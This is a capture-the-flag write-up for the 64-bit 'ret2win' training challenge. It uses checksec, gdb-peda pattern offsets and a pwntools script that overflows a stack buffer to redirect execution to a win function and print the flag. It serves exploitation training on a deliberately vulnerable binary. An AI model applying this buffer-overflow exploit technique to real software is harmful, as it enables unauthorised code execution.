## Ret2win 64
### running checksec against binary:
```
checksec ret2win
```
![1](https://user-images.githubusercontent.com/46090816/101412085-4701d980-38e2-11eb-9a96-bd956caa7d20.png)

As NX is enabled it means we deal with non-executable stack. 

### Running program
```
run
AAAABBBBCCCCDDDDEEEEFFFFGGGG
```
![1](https://user-images.githubusercontent.com/46090816/101412748-6a795400-38e3-11eb-9cea-fcf6947108af.png)

nothing interesting happens

### Overflow

lets create our pattern and feed it to program

```
pattern create 200
```

![1](https://user-images.githubusercontent.com/46090816/101413074-f12e3100-38e3-11eb-8921-6a5563d2a25a.png)
![1](https://user-images.githubusercontent.com/46090816/101413217-2aff3780-38e4-11eb-9bb6-4ee684970b62.png)

Since this is 64 bit binary RIP won't store part of our input as we can't jump there and execute it. However parts that could't be passed to RIP will be stored on the top of the stack in the  RSP lets find out our offset.
```
gdb-peda$ pattern offset AA0AAFAAbAA1AAGA
AA0AAFAAbAA1AAGA found at offset: 40

info functions
```
![1](https://user-images.githubusercontent.com/46090816/101621357-f25f7b00-3a15-11eb-9ee8-53f064cf1e68.png)


Since we know that we can overwrite the adress at offset 40 and we know the address of ret2win we can create our exploit

```
from pwn import *

exploit = "A"*40
win = p64(0x400756)

a = 0x0000000000400756

sh = process("./ret2win")
print("Input:")
sh.recvuntil("read()!")
sh.sendline(exploit + win)

sh.interactive()
```
```
 .../ret2win# python exploit.py 
[+] Starting local process './ret2win': pid 1567
Input:
[*] Switching to interactive mode


> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```
